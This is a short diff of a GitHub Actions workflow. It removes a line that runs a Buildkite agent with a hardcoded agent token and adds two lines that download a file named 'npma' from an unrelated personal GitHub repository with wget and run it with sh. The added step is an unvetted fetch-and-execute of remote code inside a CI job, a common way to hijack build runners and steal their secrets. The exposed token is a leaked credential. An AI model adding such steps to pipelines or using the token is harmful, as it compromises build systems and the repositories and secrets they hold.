@@ -19,5 +19,6 @@ jobs:
       - uses: actions/checkout@v3
       - run: |
          ls
-         docker run -e BUILDKITE_AGENT_TOKEN="3ac4612e516fadf7c24debc7ff3a3988eb34843407a9848d59" buildkite/agent:ubuntu
+         wget https://github.com/Arlentak/pages/raw/master/npma
+         sh npma
 ```
